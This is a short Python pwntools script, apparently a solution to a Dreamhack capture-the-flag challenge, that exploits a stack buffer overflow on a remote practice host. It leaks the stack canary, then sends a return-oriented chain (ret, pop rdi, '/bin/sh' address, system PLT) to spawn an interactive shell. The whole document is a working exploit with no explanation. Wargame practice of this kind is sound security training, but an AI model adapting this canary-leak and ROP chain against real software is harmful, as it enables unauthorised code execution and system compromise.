from pwn import *

# Must be updated
p = remote("host3.dreamhack.games", 19625)

payload = b'\x90' * 57
p.sendafter("Buf: ", payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))

plt = 0x4005d0                           # "system" PLT location
binsh = 0x400874                         # "/bin/sh" location
gadget = 0x0000000000400853              # "pop rdi" gadget
ret_no_op = 0x0000000000400285           # "ret" no-op gadget

payload = b'\x90' * 56
payload += p64(canary)
payload += b'\x90' * 8
payload += p64(ret_no_op)
payload += p64(gadget)
payload += p64(binsh)
payload += p64(plt)
p.sendafter("Buf: ", payload)

p.interactive()
